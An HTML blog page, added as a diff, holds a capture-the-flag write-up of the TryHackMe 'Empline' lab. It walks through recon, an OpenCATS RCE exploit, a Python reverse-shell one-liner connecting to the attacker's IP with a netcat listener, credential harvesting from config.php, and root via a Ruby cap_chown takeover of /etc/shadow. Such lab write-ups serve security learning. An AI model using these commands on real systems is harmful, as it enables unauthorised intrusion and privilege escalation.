@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/logo.png">
+
+<title>TryHackMe: Empline CTF Writeup | Sinameki Sarp's Playground</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TryHackMe: Empline CTF Writeup | Sinameki’Sarp’s Playground</title>
+<meta name="generator" content="Jekyll v4.3.1" />
+<meta property="og:title" content="TryHackMe: Empline CTF Writeup" />
+<meta name="author" content="sarpdora23" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="TryHackMe: Empline CTF Writeup" />
+<meta property="og:description" content="TryHackMe: Empline CTF Writeup" />
+<link rel="canonical" href="http://localhost:4000/TryHackMe-Empline/" />
+<meta property="og:url" content="http://localhost:4000/TryHackMe-Empline/" />
+<meta property="og:site_name" content="Sinameki’Sarp’s Playground" />
+<meta property="og:image" content="http://localhost:4000/assets/images/empline.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-11-24T00:00:00+03:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/empline.png" />
+<meta property="twitter:title" content="TryHackMe: Empline CTF Writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"sarpdora23"},"dateModified":"2022-11-24T00:00:00+03:00","datePublished":"2022-11-24T00:00:00+03:00","description":"TryHackMe: Empline CTF Writeup","headline":"TryHackMe: Empline CTF Writeup","image":"http://localhost:4000/assets/images/empline.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/TryHackMe-Empline/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/logo.png"},"name":"sarpdora23"},"url":"http://localhost:4000/TryHackMe-Empline/"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+    
+<link href="/assets/css/screen.css" rel="stylesheet">
+
+<link href="/assets/css/main.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body class="layout-post">
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Righteous%7CMerriweather:300,300i,400,400i,700,700i" rel="stylesheet">
+		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Menu Navigation
+================================================== -->
+<nav class="navbar navbar-expand-lg navbar-light bg-white fixed-top mediumnavigation nav-down">
+
+    <div class="container pr-0">
+
+    <!-- Begin Logo -->
+    <a class="navbar-brand" href="/">
+    <img src="/assets/images/logo.png" alt="Sinameki Sarp's Playground">
+    </a>
+    <!-- End Logo -->
+
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarMediumish" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+    </button>
+
+    <div class="collapse navbar-collapse" id="navbarMediumish">
+
+        <!-- Begin Menu -->
+
+            <ul class="navbar-nav ml-auto">
+
+                
+                <li class="nav-item">
+                
+                <a class="nav-link" href="/index.html">Blog</a>
+                </li>
+
+                <li class="nav-item">
+                <a class="nav-link" href="/about">About</a>
+                </li>
+
+                <li class="nav-item">
+                <a target="_blank" class="nav-link" href="https://bootstrapstarter.com/bootstrap-templates/template-mediumish-bootstrap-jekyll/"> Docs</a>
+                </li>
+
+                <li class="nav-item">
+                <a target="_blank" class="nav-link" href="https://www.wowthemes.net/themes/mediumish-wordpress/"><i class="fab fa-wordpress-simple"></i> WP Version</a>
+                </li>
+
+                <li class="nav-item">
+                <a target="_blank" class="nav-link" href="https://www.wowthemes.net/themes/mediumish-ghost/"><i class="fab fa-snapchat-ghost"></i> Ghost Version</a>
+                </li>
+
+                <li class="nav-item">
+                <a target="_blank" class="nav-link" href="https://github.com/wowthemesnet/mediumish-theme-jekyll"><i class="fab fa-github"></i> Fork on Github</a>
+                </li>
+
+                <script src="/assets/js/lunr.js"></script>
+
+
+<style>
+    .lunrsearchresult .title {color: #d9230f;}
+    .lunrsearchresult .url {color: silver;}
+    .lunrsearchresult a {display: block; color: #777;}
+    .lunrsearchresult a:hover, .lunrsearchresult a:focus {text-decoration: none;}
+    .lunrsearchresult a:hover .title {text-decoration: underline;}
+</style>
+
+
+<form class="bd-search" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+    <input type="text" class="form-control text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Type and enter..."/>
+</form>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+            </ul>
+
+        <!-- End Menu -->
+
+    </div>
+
+    </div>
+</nav>
+<!-- End Navigation
+================================================== -->
+
+<div class="site-content">
+
+<div class="container">
+
+<!-- Site Title
+================================================== -->
+<div class="mainheading">
+    <h1 class="sitetitle">Sinameki Sarp's Playground</h1>
+    <p class="lead">
+        Sinameki Sarp's CTF Writeups and blogposts...
+    </p>
+</div>
+
+<!-- Content
+================================================== -->
+<div class="main-content">
+    <!-- Begin Article
+================================================== -->
+<div class="container">
+    <div class="row">
+
+        <!-- Post Share -->
+        <div class="col-md-2 pl-0">
+            <div class="share sticky-top sticky-top-offset">
+    <p>
+        Share
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=TryHackMe: Empline CTF Writeup&url=http://localhost:4000/TryHackMe-Empline/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://facebook.com/sharer.php?u=http://localhost:4000/TryHackMe-Empline/" onclick="window.open(this.href, 'facebook-share', 'width=550,height=435');return false;">
+                <i class="fab fa-facebook-f"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/TryHackMe-Empline/" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-linkedin-in"></i>
+            </a>
+        </li>
+
+    </ul>
+    
+    <div class="sep">
+    </div>
+    <ul>
+        <li>
+        <a class="small smoothscroll" href="#disqus_thread"></a>
+        </li>
+    </ul>
+    
+</div>
+
+        </div>
+
+        <!-- Post -->
+        
+
+        <div class="col-md-9 flex-first flex-md-unordered">
+            <div class="mainheading">
+
+                <!-- Author Box -->
+                
+                <div class="row post-top-meta">
+                    <div class="col-xs-12 col-md-3 col-lg-2 text-center text-md-left mb-4 mb-md-0">
+                        
+                        <img class="author-thumb" src="https://www.gravatar.com/avatar/7e7574398bd82ac7e59443592a87ba76?s=250&d=mm&r=x" alt="Sinameki Sarp">
+                        
+                    </div>
+                    <div class="col-xs-12 col-md-9 col-lg-10 text-center text-md-left">
+                        <a target="_blank" class="link-dark" href="https://sarpdora23.github.io/">Sinameki Sarp</a><a target="_blank" href="https://twitter.com/SinamekiDev" class="btn follow">Follow</a>
+                        <span class="author-description">Half time student,full time CTF Player.</span>
+                    </div>
+                </div>
+                
+
+                <!-- Post Title -->
+                <h1 class="posttitle">TryHackMe: Empline CTF Writeup</h1>
+
+            </div>
+
+            <!-- Adsense if enabled from _config.yml (change your pub id and slot) -->
+            
+            <!-- End Adsense -->
+
+            <!-- Post Featured Image -->
+            
+
+            
+            <img class="featured-image img-fluid" src="/assets/images/empline.png" alt="TryHackMe: Empline CTF Writeup">
+            
+
+            
+            <!-- End Featured Image -->
+
+            <!-- Post Content -->
+            <div class="article-post">
+                <!-- Toc if any -->
+                
+                <!-- End Toc -->
+                <p>TryHackMe medium level web machine Empline boot2root walkthrough.</p>
+<h2 id="discovery-part">Discovery Part</h2>
+
+<p>First thing I scan all ports what services are running on the server.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> 10.10.70.209
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/1.png" alt="1.png" /></p>
+
+<p>Server has a <strong>web service</strong>, <strong>ssh</strong> service and <strong>mysql</strong> database. Then I go to webpage.</p>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/2.png" alt="2.png" /></p>
+
+<p>Nothing is there… so I wonder is there any subdomain. First assigned ip to empline.thm in <strong>“/etc/hosts”</strong> document. Then I use <strong>wfuzz</strong> for find subdomains.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>wfuzz <span class="nt">-H</span> <span class="s2">"Host:FUZZ.empline.thm"</span> <span class="nt">-u</span> http://empline.thm/ <span class="nt">-w</span> /usr/share/wordlists/SecList
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/Untitled.png" alt="Untitled" /></p>
+
+<p>So there is one subdomain “<strong>job.empline.thm</strong>”. I look what is in there and I find login page</p>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/3.png" alt="3.png" /></p>
+
+<p>and also “<strong>opencats”</strong> is running on the system. I checked source code any information about “<strong>opencats version</strong>”.</p>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/4.png" alt="4.png" /></p>
+
+<p>So I know version number and I search any exploit for “<strong>opencats 0.9.4</strong>”.</p>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/5.png" alt="5.png" /></p>
+
+<h2 id="enumeration-part">Enumeration Part</h2>
+
+<p>Perfect!! There is a “<strong>RCE(Remote Code Execution)”</strong> exploit suitable for the machine. I get the exploit from searchsploit and run…..</p>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/6.png" alt="6.png" /></p>
+
+<p>It is working!!! But something is wrong. Yes I can run the commands but its not like real shell.</p>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/7.png" alt="7.png" /></p>
+
+<p>It is not exactly shell but we can get shell easily from command execution. Server has python3 so I can run python code. I made reverse shell payload with python.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.8.50",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I run the python code on target machine and In my machine I use netcat for listen port.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">1234</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/8.png" alt="8.png" /></p>
+
+<p>I got the shell… I checked is there any config files for <strong>“opencats”</strong>. I went to “<strong>/var/www/html/opencats</strong>” folder. Let’s look files.</p>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/9.png" alt="9.png" /></p>
+
+<p><strong>“config.php”</strong> file can contains important data. I read the file with cat command.</p>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/10.png" alt="10.png" /></p>
+
+<p>I can login mysql database with this information. Let’s try…</p>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/11.png" alt="11.png" /></p>
+
+<p>I succesfully loged in with credentials. I found databases. Let’s continue with opencats.</p>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/Untitled%201.png" alt="Untitled" /></p>
+
+<p>“<strong>user</strong>” table looks interesting.</p>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/12.png" alt="12.png" /></p>
+
+<p>There are encrypted passwords. I check “<strong>crackstation.net</strong>”</p>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/13.png" alt="13.png" /></p>
+
+<p>I know the password but I need user’s name for ssh. I looked users on the machine.</p>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/Untitled%202.png" alt="Untitled" /></p>
+
+<p>Try login ssh with username and password.</p>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/14.png" alt="14.png" /></p>
+
+<h2 id="privilege-escalation-part">Privilege Escalation Part</h2>
+
+<p>Find and read user flag.</p>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/15.png" alt="15.png" /></p>
+
+<p>Last thing I need to become root for successfully finish the machine. I upload “<strong>linpeas.sh”</strong> tool for find any information become root.</p>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/16.png" alt="16.png" /></p>
+
+<p><strong>Linpeas</strong> shows there are some capabilities user can. “<strong>/usr/local/bin/ruby = cap_chown+ep</strong>” means user can change any file’s owner with ruby. I change “<strong>/etc/shadow</strong>” file’s owner because if user write the shadow file then can change the root’s password.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="n">ruby</span> <span class="o">-</span><span class="n">e</span> <span class="s1">'require "fileutils"; FileUtils.chown "george", "george", "/etc/shadow"'</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/17.png" alt="17.png" /></p>
+
+<p>I changed root’s password. Let’s try to login root.</p>
+
+<p><img src="../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/18.png" alt="18.png" /></p>
+
+<h3 id="thank-you-for-reading-">THANK YOU FOR READING 🙂</h3>
+
+
+            </div>
+
+            <!-- Rating -->
+            
+
+            <!-- Post Date -->
+            <p>
+            <small>
+                <span class="post-date"><time class="post-date" datetime="2022-11-24">24 Nov 2022</time></span>           
+                
+                </small>
+            </p>
+
+            <!-- Post Categories -->
+            <div class="after-post-cats">
+                <ul class="tags mb-4">
+                    
+                    
+                    <li>
+                        <a class="smoothscroll" href="/categories#CTF">CTF</a>
+                    </li>
+                    
+                    <li>
+                        <a class="smoothscroll" href="/categories#TryHackMe">TryHackMe</a>
+                    </li>
+                    
+                    <li>
+                        <a class="smoothscroll" href="/categories#Writeup">Writeup</a>
+                    </li>
+                    
+                </ul>
+            </div>
+            <!-- End Categories -->
+
+            <!-- Post Tags -->
+            <div class="after-post-tags">
+                <ul class="tags">
+                    
+                    
+                    <li>
+                        <a class="smoothscroll" href="/tags#red">#red</a>
+                    </li>
+                    
+                    <li>
+                        <a class="smoothscroll" href="/tags#yellow">#yellow</a>
+                    </li>
+                    
+                </ul>
+            </div>
+            <!-- End Tags -->
+
+            <!-- Prev/Next -->
+            <div class="row PageNavigation d-flex justify-content-between font-weight-bold">
+            
+            
+            <div class="clearfix"></div>
+            </div>
+            <!-- End Categories -->
+
+        </div>
+        <!-- End Post -->
+
+    </div>
+</div>
+<!-- End Article
+================================================== -->
+
+<!-- Begin Comments
+================================================== -->
+
+    <div class="container">
+        <div id="comments" class="row justify-content-center mb-5">
+            <div class="col-md-8">
+                <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+
+            </div>
+        </div>
+    </div>
+
+<!--End Comments
+================================================== -->
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+</div>
+
+
+<!-- Bottom Alert Bar
+================================================== -->
+<div class="alertbar">
+	<div class="container text-center">
+		<span><img src="/assets/images/logo.png" alt="Sinameki'Sarp's Playground"> &nbsp; Never miss a <b>story</b> from us, subscribe to our newsletter</span>
+        <form action="https://wowthemes.us11.list-manage.com/subscribe/post?u=8aeb20a530e124561927d3bd8&amp;id=8c3d2d214b" method="post" name="mc-embedded-subscribe-form" class="wj-contact-form validate" target="_blank" novalidate>
+            <div class="mc-field-group">
+            <input type="email" placeholder="Email" name="EMAIL" class="required email" id="mce-EMAIL" autocomplete="on" required>
+            <input type="submit" value="Subscribe" name="subscribe" class="heart">
+            </div>
+        </form>
+	</div>
+</div>
+
+    
+</div>
+
+<!-- Categories Jumbotron
+================================================== -->
+<div class="jumbotron fortags">
+	<div class="d-md-flex h-100">
+		<div class="col-md-4 transpdark align-self-center text-center h-100">
+            <div class="d-md-flex align-items-center justify-content-center h-100">
+                <h2 class="d-md-block align-self-center py-1 font-weight-light">Explore <span class="d-none d-md-inline">→</span></h2>
+            </div>
+		</div>
+		<div class="col-md-8 p-5 align-self-center text-center">
+            
+            
+                
+                    <a class="mt-1 mb-1" href="/categories#TryHackMe">TryHackMe (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/categories#CTF">CTF (1)</a>
+                
+                    <a class="mt-1 mb-1" href="/categories#Writeup">Writeup (1)</a>
+                
+            
+            
+		</div>
+	</div>
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-6 text-center text-lg-left">
+                Copyright © 2022 Sinameki Sarp's Playground 
+            </div>
+            <div class="col-md-6 col-sm-6 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/mediumish-free-jekyll-template/">Mediumish Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts
+================================================== -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js" integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut" crossorigin="anonymous"></script>
+
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js" integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k" crossorigin="anonymous"></script>
+
+<script src="/assets/js/mediumish.js"></script>
+
+
+
+<script src="/assets/js/ie10-viewport-bug-workaround.js"></script> 
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
